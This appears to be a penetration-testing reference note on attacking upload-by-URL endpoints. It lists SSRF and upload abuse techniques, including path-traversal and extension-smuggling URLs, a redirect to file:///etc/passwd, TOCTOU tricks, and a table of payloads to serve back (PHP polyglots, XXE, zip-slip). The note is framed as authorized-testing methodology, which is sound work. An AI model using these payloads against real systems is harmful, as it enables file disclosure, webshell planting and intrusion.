# Upload-by-URL — "paste a link" is a fetch AND a store

## The shape — two vulnerabilities for the price of one endpoint

```
POST /api/upload  {"url": "https://you.tld/x.png"}
  → server fetches it (SSRF!)
  → server stores it under a key it picks (upload!)
```

The SSRF angle belongs to `web-ssrf`; the upload angle: you control the
CONTENT (your URL serves anything) and sometimes the NAME/TYPE.

## The fetch+store chain — what you control

| Input field | Controls |
|---|---|
| `url` | the fetched bytes — polyglots land intact |
| `filename`/`name` (separate field) | stored name — traversal/exec-ext |
| `Content-Type` your server returns | the stored mime claim |
| redirect target on your URL | the FINAL fetched bytes |
| URL's path basename | if the store derives name from URL path: `you.tld/../../x.php` |

## The name-from-URL trap — `basename(urlpath)` sanitizers

`{"url":"https://you/x.png"}` → stored as `x.png` — but:

```
you.tld/..%2f..%2fx.php       # urlpath traversal if store doesn't basename
you.tld/a.php?x=.png          # basename may read the path
you.tld/x.png;.php            # param tricks
you.tld/x.php%3f.png          # encoded '?'
you.tld/%2e%2e%2f%2e%2e%2fx.php  # full-encoded
```

The app's basename/sanitize on the URL path is the surface — same
traversal grammar, different carrier.

## Content-Type — who decides the stored type

- your server's `Content-Type` response header — trivially controlled
- sniffed post-fetch — polyglot needed
- derived from URL extension — name tricks again

## The double-fetch — TOCTOU between fetch and store

`HEAD → check → GET → store`: your server returns a valid image on HEAD
(check passes) then payload on GET. Or DNS-rebind: first resolve → public
IP (check), second → internal (the real fetch) — `skills/web-ssrf/references/dns-rebind.md`.

## Redirect games

Your URL → 302 → `file:///etc/passwd` (fetcher honoring file://), →
internal URL, → `gopher://`, → `data:` — the redirect chain inherits the
fetcher's scheme handling.

## What to serve back — the payload inventory

| Fetch stores as | Serve |
|---|---|
| raw file verbatim | polyglot — GIF89a+php, phar, zip |
| parsed image | real image + appended/chunk payload |
| XML/YAML/docx | XXE / typed-tag payload |
| text/csv | formula injection |
| archive | zip-slip archive |
| anything for `import` | the consumer's attack format |

## Falsifiers

- the fetch is allowlisted to known hosts / pinned IP and content is
  re-encoded strictly
- the stored object never reachable and never parsed

## Output to record

- which of url/name/type/redirect carried the payload
- the stored object's serve URL + verdict
